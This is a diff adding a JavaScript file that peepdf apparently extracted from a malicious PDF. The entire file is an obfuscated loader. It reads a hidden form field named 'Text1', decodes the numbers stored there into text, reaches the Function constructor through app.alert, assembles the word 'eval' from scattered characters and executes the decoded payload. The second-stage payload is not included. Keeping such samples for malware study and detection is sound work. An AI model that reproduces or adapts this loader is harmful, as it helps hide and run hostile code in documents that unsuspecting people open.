@@ -1,0 +1,86 @@
+// peepdf comment: Javascript code located in object 106 (version 1)
+
+function rhjahahagk() {
+    function wggsadfsadf(input2) {
+        var asdf = bsdgdbdsfvsgfsadf(input2);
+        var asfdsad = hwegfgdsgdsfgds(asdf);
+        return asfdsad;
+    }
+
+    function ergtrgsgdsfgdfsg(sadsfjkgAD) {
+        var jdhjkashfhaui = "0";
+        return jdhjkashfhaui + sadsfjkgAD;
+    }
+
+    function shfdsfvsdfvdsfgds(str) {
+        return str.replace(/:/g, ",");
+    }
+
+    function fdshwergdsfgdsfg(asd) {
+        return String.fromCharCode(asd);
+    }
+
+    function bsdgdbdsfvsgfsadf(str) {
+        var set = '';
+        var s = '';
+        var ee = '';
+        str = shfdsfvsdfvdsfgds(str);
+        str = str.split(",");
+        for (var i = 0; i < str.length; i++) {
+            ee = str[i] / (18 / 6);
+            set += erhgsdfgdsgdsf(ee.toString(64 / 4));
+        }
+        return set;
+    }
+
+    function hwegfgdsgdsfgds(hex) {
+        var str = '';
+        var zzz = fdshwergdsfgdsfg;
+        for (var i = 0; i < hex.length; i += 2) {
+            var sssss = hex.substr(i, 2);
+            str += fdshwergdsfgdsfg('asdfwefwuiegfyuadsui0x'.substr(20, 2) + sssss);
+        }
+        return str;
+    }
+
+    function erhgsdfgdsgdsf(eds) {
+        var set = '';
+        var s = eds;
+        if (s.length < 2) {
+            set = ergtrgsgdsfgdfsg(s);
+        } else {
+            set = s;
+        }
+        return set;
+    }
+
+    function ghsgffsadfsadf(d, dd) {
+        return d + dd;
+    }
+    var b2 = getField("Text1");
+    var aDFsdfasd = b2.value;
+    var aDFsdfasd = wggsadfsadf(aDFsdfasd);
+
+    function fjkasdf() {
+        return "constr" + "uctor";
+    }
+    var czvhjashavsiodhvuipashcpioasdcs = app.alert[fjkasdf()];
+
+    function asdfeaf(s) {
+        if (s == 0) {
+            return false + ""
+        } else {
+            return true + ""
+        }
+    }
+    var susea = asdfeaf(1);
+    var seasus = asdfeaf(0);
+    var daeaefe = "eafadsfjekafhjkavadfefafaef";
+    var argqrgqadsfwqgwafdsfwef = susea[(3 + 3) / 2];
+    argqrgqadsfwqgwafdsfwef += daeaefe[(16 + 16) / 2];
+    argqrgqadsfwqgwafdsfwef += seasus[((1 + 9) / 5) - 1];
+    argqrgqadsfwqgwafdsfwef += seasus[(2 + 10) / 6];
+    czvhjashavsiodhvuipashcpioasdcs[argqrgqadsfwqgwafdsfwef](aDFsdfasd);
+}
+rhjahahagk();
+
